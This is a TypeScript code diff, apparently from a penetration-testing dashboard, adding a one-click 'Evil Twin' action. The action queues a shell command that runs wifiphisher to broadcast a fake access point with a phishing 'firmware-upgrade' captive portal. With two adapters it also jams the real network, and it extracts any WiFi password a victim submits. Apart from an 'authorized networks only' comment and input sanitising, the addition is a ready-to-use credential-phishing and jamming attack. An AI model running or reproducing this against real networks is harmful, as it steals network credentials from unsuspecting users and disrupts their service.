@@ -272,6 +272,58 @@ export async function autoPwn(formData: FormData) {
 }
 
 /**
+ * One-click Evil Twin / captive-portal credential capture for an AP. Stands up a
+ * fake AP with the same SSID and a phishing captive portal (wifiphisher), runs it
+ * HEADLESSLY in a pseudo-tty, and quits on the first captured password — all in a
+ * single bounded job. The submitted password surfaces in the inspect panel.
+ *
+ * Authorized networks only. wifiphisher needs root and a WiFi adapter; with two
+ * adapters it also jams the real AP to push clients onto the twin.
+ */
+export async function autoEvilTwin(formData: FormData) {
+  const email = await requireUser();
+  const runnerId = String(formData.get("runnerId") ?? "");
+  const bssid = String(formData.get("bssid") ?? "").trim().toUpperCase();
+  const ssid = String(formData.get("ssid") ?? "").trim();
+  if (!runnerId || !/^([0-9A-F]{2}:){5}[0-9A-F]{2}$/.test(bssid)) {
+    redirect(`${BACK}?error=${encodeURIComponent("Pick a machine and a valid AP.")}`);
+  }
+  // SSID is embedded in a shell command, so restrict it to a safe charset (no
+  // quotes/backslashes/$/backticks). Unusual SSIDs fall back to the manual
+  // command shown in the Evil Twin panel.
+  if (!/^[A-Za-z0-9 ._@#:+\-]{1,32}$/.test(ssid)) {
+    redirect(
+      `${BACK}?error=${encodeURIComponent(
+        "This SSID has characters that can't be auto-run safely — use the manual Evil Twin command below.",
+      )}`,
+    );
+  }
+
+  // wifiphisher needs a real terminal (curses UI), so wrap it in `script` to give
+  // it a PTY. -qS quits on the first credential capture; --logging records the
+  // session (incl. the POST'd password). One adapter => no jamming (-nJ); two+
+  // => jam the real AP. Bounded to ~5 min so the job can't run forever.
+  const cmd =
+    `bash -lc 'command -v wifiphisher >/dev/null || { echo "wifiphisher not installed — install it from Machines, then retry."; exit 0; }; ` +
+    `rm -f /tmp/rdet-out.log; ` +
+    `N=$(for d in /sys/class/net/*; do b=$(basename "$d"); iw dev "$b" info >/dev/null 2>&1 && echo x; done | wc -l); ` +
+    `if [ "$N" -eq 0 ]; then echo "No WiFi adapter found on this machine."; exit 0; fi; ` +
+    `J="-nJ"; [ "$N" -ge 2 ] && J=""; ` +
+    `echo "[*] Evil-twin captive portal for \\"${ssid}\\" — broadcasting a fake AP + password page (up to 5 min; waits for a victim to submit the WiFi password)…"; ` +
+    `timeout 300 script -qec "wifiphisher -e \\"${ssid}\\" -p firmware-upgrade -qS $J --force-hostapd --logging --logpath /tmp/rdet-out.log" /dev/null >/dev/null 2>&1; ` +
+    `echo "== CAPTURED =="; ` +
+    `grep -aiE "password|passphrase|psk|credential|post data|wfphshr|pre-shared" /tmp/rdet-out.log 2>/dev/null | grep -aviE "no |fail|invalid prompt" | tail -n 20; ` +
+    `if ! [ -s /tmp/rdet-out.log ]; then echo "No session captured (wifiphisher could not start — check adapter/root)."; fi; ` +
+    `echo "== END =="; echo "(If nothing above, no victim submitted a password within the window.)"'`;
+
+  await prisma.job.create({
+    data: { runnerId, tool: "custom", target: `wifi-eviltwin:${bssid}`, args: cmd, queuedBy: email },
+  });
+  revalidatePath(BACK);
+  redirect(`${BACK}?eviltwin=1`);
+}
+
+/**
  * Save a WiFi security review as findings on an authorized engagement — turns the
  * assessment into report-ready items (recomputed server-side; one finding per
  * real issue).
